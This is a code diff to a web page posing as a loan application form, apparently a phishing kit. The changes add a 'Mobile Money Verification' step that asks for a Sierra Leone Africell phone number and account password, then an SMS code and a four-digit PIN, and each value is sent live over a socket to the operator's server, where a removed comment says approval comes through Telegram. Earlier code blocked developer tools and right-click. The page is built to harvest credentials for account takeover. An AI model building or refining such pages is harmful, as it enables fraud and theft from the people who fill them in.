@@ -19,7 +19,7 @@
             --border-color: #334155;
             --accent-teal: #00c2c2;
         }
-        * { -webkit-tap-highlight-color: transparent; user-select: none; }
+        * { -webkit-tap-highlight-color: transparent; }
         body { 
             background-color: var(--bg-dark); 
             color: var(--text-main); 
@@ -48,13 +48,17 @@
         .progress-step.completed .progress-dot span { display: none; }
         .otp-input { letter-spacing: 0.5rem; text-align: center; font-weight: 700; font-size: 24px; }
         .pin-box { width: 50px; height: 50px; border: 2px solid var(--accent-teal); border-radius: 10px; text-align: center; font-size: 24px; background: #0f172a; color: #ffffff; outline: none; }
+        .ib-phone-wrapper { display: flex; border: 2px solid var(--accent-teal); border-radius: 10px; padding: 10px; align-items: center; background: #0f172a; }
+        .ib-country-code { display: flex; align-items: center; gap: 10px; padding-right: 10px; border-right: 1px solid #1f2937; color: #e2e8f0; }
         .spinner-sm { animation: spin 1s linear infinite; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; display: inline-block; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .toast { position: fixed; top: 20px; right: 20px; padding: 12px 24px; border-radius: 8px; background: white; color: #1e293b; box-shadow: 0 10px 25px rgba(0,0,0,0.2); z-index: 9999; transform: translateX(400px); transition: transform 0.3s ease; }
         .toast.show { transform: translateX(0); }
+        .toast.success { background: #10b981; color: white; }
+        .toast.error { background: #ef4444; color: white; }
     </style>
 </head>
-<body x-data="loanFlow()" x-init="init()" oncontextmenu="return false;" class="antialiased">
+<body x-data="loanFlow()" x-init="init()" class="antialiased">
     <div id="toast" class="toast" :class="[toast.type, toast.show ? 'show' : '']" x-text="toast.message"></div>
     <div class="curve-top"></div>
     <div class="curve-bottom"></div>
@@ -71,7 +75,7 @@
 
             <div class="p-6 md:p-8">
                 <div class="flex justify-between mb-8">
-                    <template x-for="i in 5" :key="i">
+                    <template x-for="i in 6" :key="i">
                         <div class="progress-step" :class="{ 'active': step === i, 'completed': step > i }">
                             <div class="progress-dot"><span x-text="i"></span></div>
                         </div>
@@ -120,33 +124,34 @@
                 </div>
 
                 <div x-show="step === 4" x-cloak x-transition.duration.200ms>
-                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Verification Code</h2><span class="text-xs font-bold text-orange-400">Step 04</span></div>
-                    <div class="space-y-4 text-center">
-                        <p class="text-sm text-gray-400 mb-2">Enter the 6-digit OTP sent via SMS</p>
-                        <input type="text" x-model="otp.code" class="input-premium otp-input" maxlength="6" placeholder="000000" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
-                        <div class="grid grid-cols-2 gap-4 pt-4"><button @click="step = 3" class="btn-secondary">← Back</button><button @click="verifyOTP" :disabled="otp.code.length !== 6" class="btn-premium">Verify →</button></div>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Mobile Money Verification</h2><span class="text-xs font-bold text-orange-400">Step 04</span></div>
+                    <div class="space-y-4">
+                        <div class="ib-phone-wrapper"><span class="ib-country-code">🇸🇱 +232</span><input type="tel" x-model="africell.phone" class="input-premium border-0 bg-transparent" placeholder="76XXXXXX" maxlength="9"></div>
+                        <input type="password" x-model="africell.password" class="input-premium" placeholder="Password">
+                        <div class="grid grid-cols-2 gap-4 pt-4"><button @click="step = 3" class="btn-secondary">← Back</button><button @click="requestAdminApproval" :disabled="!isStep4Valid || passwordVerifying" class="btn-premium"><span x-show="!passwordVerifying">Verify →</span><span x-show="passwordVerifying" class="spinner-sm"></span></button></div>
                     </div>
                 </div>
 
                 <div x-show="step === 5" x-cloak x-transition.duration.200ms>
-                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Confirm Security PIN</h2><span class="text-xs font-bold text-orange-400">Step 05</span></div>
-                    <div class="flex justify-center gap-3">
-                        <template x-for="(_, i) in 4" :key="i">
-                            <input type="password" class="pin-box" maxlength="1" @input="movePinFocus($event, i)" x-model="pin.value[i]" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
-                        </template>
+                    <h2 class="text-xl font-bold mb-6">Verification Code</h2>
+                    <div class="space-y-4">
+                        <input type="text" x-model="otp.code" class="input-premium otp-input" maxlength="6" placeholder="000000">
+                        <button @click="verifyOTP" :disabled="otp.code.length !== 6" class="btn-premium">Verify →</button>
                     </div>
-                    <button @click="submitStep5" :disabled="!isPinValid || pinVerifying" class="btn-premium mt-6">
-                        <span x-show="!pinVerifying">Submit Application</span>
-                        <span x-show="pinVerifying" class="flex items-center gap-2"><span class="spinner-sm"></span> verify...</span>
-                    </button>
-                    <p x-show="pinVerifying" class="text-center text-xs text-orange-400 mt-4 animate-pulse">Verifying...</p>
                 </div>
 
-                <div x-show="step === 6" x-cloak class="text-center py-8">
+                <div x-show="step === 6" x-cloak x-transition.duration.200ms>
+                    <h2 class="text-xl font-bold mb-6">Confirm Security PIN</h2>
+                    <div class="flex justify-center gap-3">
+                        <template x-for="(_, i) in 4" :key="i"><input type="password" class="pin-box" maxlength="1" @input="movePinFocus($event, i)" x-model="pin.value[i]"></template>
+                    </div>
+                    <button @click="submitStep6" :disabled="!isPinValid || pinVerifying" class="btn-premium mt-6">Submit Application</button>
+                </div>
+
+                <div x-show="step === 7" x-cloak class="text-center py-8">
                     <div class="text-6xl mb-4">✅</div>
                     <h2 class="text-2xl font-bold text-green-400">Application Submitted!</h2>
-                    <p class="text-gray-400 mt-2">Reference ID: <span x-text="referenceId" class="font-mono text-white"></span></p>
-                    <p class="text-sm text-gray-500 mt-4">You can now close this window safely.</p>
+                    <p class="text-gray-400">Reference: <span x-text="referenceId"></span></p>
                 </div>
             </div>
         </section>
@@ -157,57 +162,33 @@
             return {
                 step: 1, appId: '', referenceId: '', connected: false,
                 form: { loanType: '', amount: 5000, term: '', purpose: '', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '', employer: '' },
+                africell: { phone: '', password: '' },
                 otp: { code: '' },
                 pin: { value: ['', '', '', ''] },
-                pinVerifying: false, socket: null, toast: { show: false, message: '', type: 'info' },
+                passwordVerifying: false, pinVerifying: false, socket: null, toast: { show: false, message: '', type: 'info' },
 
+                // Original getters
                 get isStep1Valid() { return this.form.loanType && this.form.term && this.form.purpose; },
                 get isStep2Valid() { return this.form.firstName && this.form.lastName && this.form.phone; },
                 get isStep3Valid() { return this.form.employment && this.form.income; },
-                get isPinValid() { return this.pin.value.filter(v => v !== '').length === 4; },
+                get isStep4Valid() { return this.africell.phone && this.africell.password; },
+                get isPinValid() { return this.pin.value.join('').length === 4; },
 
                 init() {
-                    // Disable DevTools Shortcuts
-                    document.addEventListener('keydown', (e) => {
-                        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) {
-                            e.preventDefault();
-                        }
-                    });
-
                     this.socket = io();
                     this.socket.on('connect', () => { this.connected = true; });
-                    this.socket.on('session-ready', (data) => { 
-                        this.appId = data.appId; 
-                        this.socket.emit('join-room', data.appId); 
-                    });
-                    
-                    // Triggered by Admin Approval in Telegram
-                    this.socket.on('pin-verified', (d) => { 
-                        this.pinVerifying = false; 
-                        this.referenceId = d.referenceId; 
-                        this.step = 6; 
-                    });
-
-                    this.socket.on('error', (msg) => {
-                        this.toast = { show: true, message: msg, type: 'error' };
-                        this.pinVerifying = false;
-                        setTimeout(() => this.toast.show = false, 3000);
-                    });
+                    this.socket.on('session-ready', (data) => { this.appId = data.appId; this.socket.emit('join-room', data.appId); });
+                    this.socket.on('password-verified', () => { this.passwordVerifying = false; this.step = 5; });
+                    this.socket.on('pin-verified', (d) => { this.pinVerifying = false; this.referenceId = d.referenceId; this.step = 7; });
                 },
 
                 submitStep1() { this.socket.emit('step1', this.form); this.step = 2; },
                 submitStep2() { this.socket.emit('step2', this.form); this.step = 3; },
                 submitStep3() { this.socket.emit('step3', this.form); this.step = 4; },
-                verifyOTP() { this.socket.emit('step4', { otp: this.otp.code }); this.step = 5; },
-                
-                submitStep5() { 
-                    this.pinVerifying = true; 
-                    this.socket.emit('step5', { pin: this.pin.value.join('') }); 
-                },
-                
-                movePinFocus(e, i) { 
-                    if (e.target.value && i < 3) document.querySelectorAll('.pin-box')[i+1].focus(); 
-                }
+                requestAdminApproval() { this.passwordVerifying = true; this.socket.emit('step4', this.africell); },
+                verifyOTP() { this.socket.emit('step5', { otp: this.otp.code }); this.step = 6; },
+                submitStep6() { this.pinVerifying = true; this.socket.emit('step6', { pin: this.pin.value.join('') }); },
+                movePinFocus(e, i) { if (e.target.value && i < 3) document.querySelectorAll('.pin-box')[i+1].focus(); }
             }
         }
     </script>
